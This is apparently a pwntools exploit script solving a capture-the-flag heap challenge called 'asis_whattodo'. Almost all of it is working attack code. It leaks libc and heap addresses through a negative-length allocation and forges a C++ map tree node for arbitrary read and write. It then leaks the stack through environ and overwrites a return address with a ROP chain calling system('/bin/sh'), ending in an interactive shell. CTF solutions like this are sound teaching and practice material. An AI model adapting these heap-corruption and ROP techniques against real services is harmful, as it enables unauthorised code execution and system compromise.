#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './asis_whattodo'
context.terminal = ['tmux', 'new-window']
argv = []
env = {'LD_PRELOAD':'./libc.so.6'}
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# new(len+1)
# memset used
def new_todo(title,_len):
    io.sendlineafter(">", str(1))
    io.sendlineafter("Title:", title)
    io.sendlineafter("Length:", str(_len))

def edit_todo(title,data):
    io.sendlineafter(">", str(3))
    io.sendlineafter("Title:", title)
    io.sendlineafter("TODO:", data)

def del_todo(title):
    io.sendlineafter(">", str(2))
    io.sendlineafter("Title:", title)

def show_todo(title):
    io.sendlineafter(">", str(4))
    io.sendlineafter("Title:", title)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
breakrva 0x2589
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

'''
map storing tuples
'''

io = start(argv, env=env)

new_todo("a", 0x440)
new_todo("b", 0x10)

del_todo("a")
new_todo("a", -1)

show_todo("a")
io.recvuntil("TODO: ")
leak = io.recvline()[0:6]
leak = u64(leak.ljust(8, b"\x00"))
libc.address = leak - 0x203f20
log.info(f"Libc base: {hex(libc.address)}")

del_todo("a")
new_todo("a", -1)
show_todo("a")
io.recvuntil("TODO: ")
leak = io.recvline()[0:5]
leak = u64(leak.ljust(8, b"\x00"))
heap_leak= leak << 12
print(f"Heap leak: {hex(heap_leak)}")

# arrange heap such that we have
# c_data
# d_data
# d_metadata
#
# with this we can nicely corrupt d from c_data
new_todo("d", 0x60)
del_todo("d")
new_todo("c", -1)
new_todo("d", 0x10)
edit_todo("c", "D"*8)
edit_todo("d", "F"*8)
#io.interactive()
payload = b"D"*0x10
# d_data
payload += p64(0x0)+p64(0x21)
payload += b"F"*0x10
# d_metadata
# fake some rb_tree struct which is used internally
# by c++ map
payload += p64(0x0)+p64(0x61)
payload += p32(0)+p32(0x77dc)
payload += p64(heap_leak+0x340)
payload += p64(0)*2
payload += p64(heap_leak+0x410) # key
payload += p64(0x1)+p64(0x64)+p64(0)
payload += p64(libc.sym['environ'])
payload += p64(0xffffffff)
edit_todo("c", payload)

show_todo("d")
io.recvuntil("TODO: ")
leak = io.recvline()[0:6]
stack_leak = u64(leak.ljust(8, b"\x00"))
log.info(f"stack leak: {hex(stack_leak)}")

ret_addr = stack_leak - 0x130 - 0x20
payload = b"D"*0x10
# d_data
payload += p64(0x0)+p64(0x21)
payload += b"F"*0x10
# d_metadata
# fake some rb_tree struct which is used internally
# by c++ map
payload += p64(0x0)+p64(0x61)
payload += p32(0)+p32(0x77dc)
payload += p64(heap_leak+0x340)
payload += p64(0)*2
payload += p64(heap_leak+0x410) # key
payload += p64(0x1)+p64(0x64)+p64(0)
payload += p64(ret_addr)
payload += p64(0xffffffff)
edit_todo("c", payload)

ret = libc.address + 0x2882f
pop_rdi_ret = libc.address + 0x10f75b

payload = p64(ret)*0x10
payload += p64(pop_rdi_ret)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(ret)
payload += p64(libc.sym['system'])

edit_todo("d", payload)

io.interactive()
